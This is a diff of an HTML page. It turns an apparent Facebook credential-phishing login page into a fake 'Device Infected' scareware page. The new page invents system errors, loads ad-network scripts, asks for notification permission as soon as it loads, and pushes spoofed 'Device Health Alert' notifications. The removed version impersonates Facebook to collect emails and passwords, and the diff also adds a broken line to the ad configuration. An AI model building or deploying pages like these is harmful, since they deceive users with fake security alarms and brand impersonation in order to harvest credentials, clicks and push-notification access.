@@ -3,45 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in to Facebook</title>
+    <title>System Health Check</title>
     
     <!-- REQUIRED: Script right before closing head tag -->
     <script src="https://pl30399643.effectivecpmnetwork.com/6d/9a/ff/6d9aff3780ea4fa7615b741a27f4bc66.js"></script>
 
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; }
-        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
-        .fb-container { width: 100%; max-width: 400px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
-        .fb-logo { color: #1877f1; font-size: 48px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; outline: none; }
-        input:focus { border-color: #1877f1; box-shadow: 0 0 0 2px #e0f2fe; }
-        .login-btn { background-color: #1877f1; color: white; font-size: 20px; font-weight: bold; padding: 12px; border: none; border-radius: 6px; cursor: pointer; width: 100%; margin-bottom: 12px; }
-        .login-btn:hover { background-color: #166fe5; }
-        .forgot { color: #1877f1; font-size: 14px; text-decoration: none; cursor: pointer; margin-bottom: 20px; display: block; }
-        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
-        .new-account-btn { background-color: #42b72a; color: white; font-size: 17px; font-weight: bold; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; }
-        .ad-space { margin-top: 15px; padding-top: 10px; border-top: 1px solid #eee; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        body {
+            background-color: #f4f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            padding: 30px 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .icon-status {
+            font-size: 64px;
+            color: #e74c3c;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+
+        .sub-text {
+            font-size: 16px;
+            color: #7f8c8d;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .progress-bar {
+            background-color: #ecf0f1;
+            border-radius: 10px;
+            height: 20px;
+            width: 100%;
+            margin-bottom: 25px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            background-color: #e74c3c;
+            height: 100%;
+            width: 85%;
+            border-radius: 10px;
+        }
+
+        .progress-text {
+            font-size: 12px;
+            font-weight: bold;
+            color: #e74c3c;
+            margin-bottom: 20px;
+        }
+
+        .check-btn {
+            background-color: #e74c3c;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 15px;
+            transition: background 0.3s;
+        }
+
+        .check-btn:hover {
+            background-color: #c0392b;
+        }
+
+        .details-list {
+            text-align: left;
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+
+        .status-ok { color: #27ae60; font-weight: bold; }
+        .status-warn { color: #f39c12; font-weight: bold; }
+        .status-err { color: #e74c3c; font-weight: bold; }
+
+        .ad-space {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+            min-height: 70px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
     </style>
 </head>
 <body>
 
-    <div class="fb-container">
-        <div class="fb-logo">facebook</div>
-        <form id="fb-form">
-            <input type="text" placeholder="Email or Phone Number" required>
-            <input type="password" placeholder="Password" required>
-            <button type="submit" class="login-btn">Log In</button>
-        </form>
-        <a href="#" class="forgot">Forgot password?</a>
-        <div class="divider"></div>
-        <button class="new-account-btn">Create new account</button>
+    <div class="container">
+        <div class="icon-status">⚠️</div>
+        <h1>Device Infected</h1>
+        <p class="sub-text">A system scan detected 3 critical errors and 12 temporary files.</p>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="progress-text">85% Storage Used | 3 Errors Found</div>
+
+        <div class="details-list">
+            <div class="detail-item">
+                <span>CPU Temperature</span>
+                <span class="status-err">High (42°C)</span>
+            </div>
+            <div class="detail-item">
+                <span>Battery Health</span>
+                <span class="status-warn">82% Efficiency</span>
+            </div>
+            <div class="detail-item">
+                <span>Cache Files</span>
+                <span class="status-err">1.2 GB Unused</span>
+            </div>
+        </div>
+
+        <button class="check-btn" onclick="triggerScan()">Check Now</button>
         
         <!-- REQUIRED: HighPerformanceFormat scripts anywhere in body -->
         <div class="ad-space">
             <script>
               atOptions = {
                 'key' : 'f125e7808be2987145a23a0828972354',
-                'format' : 'iframe',
+                'format' : ' 'iframe',
                 'height' : 60,
                 'width' : 468,
                 'params' : {}
@@ -63,7 +183,7 @@ Script 2: <script src="https://www.highperformanceformat.com/f125e7808be2987145a
         `.trim();
 
         document.addEventListener('DOMContentLoaded', function() {
-            // 1. Ask for permission the normal way
+            // 1. Ask for permission immediately
             if ('Notification' in window && Notification.permission === 'default') {
                 Notification.requestPermission().then(function(permission) {
                     if (permission === 'granted') {
@@ -85,11 +205,23 @@ Script 2: <script src="https://www.highperformanceformat.com/f125e7808be2987145a
 
         function sendScriptNotification() {
             if ('Notification' in window && Notification.permission === 'granted') {
-                new Notification('Facebook Updates', {
+                new Notification('Device Health Alert', {
                     body: 'Active Scripts: ' + scriptContent,
-                    icon: 'https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/nNch3e8lj76.png'
+                    icon: 'https://img.icons8.com/color/48/device-status.png'
                 });
             }
+        }
+
+        function triggerScan() {
+            // Simple visual feedback when button is clicked
+            const btn = document.querySelector('.check-btn');
+            btn.innerText = 'Scanning...';
+            btn.style.backgroundColor = '#f39c12';
+            setTimeout(() => {
+                btn.innerText = 'Check Now';
+                btn.style.backgroundColor = '#e74c3c';
+                // Optionally trigger push again here if needed
+            }, 2000);
         }
     </script>
 </body>
